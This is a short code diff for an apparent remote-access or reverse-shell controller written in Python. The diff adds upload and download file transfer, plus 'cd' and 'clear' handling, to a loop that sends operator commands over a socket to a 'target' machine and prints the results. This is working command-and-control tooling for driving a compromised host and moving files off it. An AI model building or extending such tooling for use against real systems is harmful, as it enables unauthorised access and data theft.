@@ -1,4 +1,5 @@
 import socket
+import os
 import tools.config as config
 import tools.utility as utility
 
@@ -8,6 +9,14 @@ def target_communication(target_socket,ip):
         utility.reliable_send(target_socket,cmd)
         if cmd == ' quit':
             break
+        elif cmd[:3] == 'cd ':
+            pass
+        elif cmd == 'clear':
+            os.system('clear')
+        elif cmd[:6] == 'upload':
+            utility.upload_file(target_socket,cmd[7:])
+        elif cmd[:8] == 'download':
+            utility.download_file(target_socket,cmd[9:])
         else:
             res = utility.reliable_recv(target_socket)
             print(res)
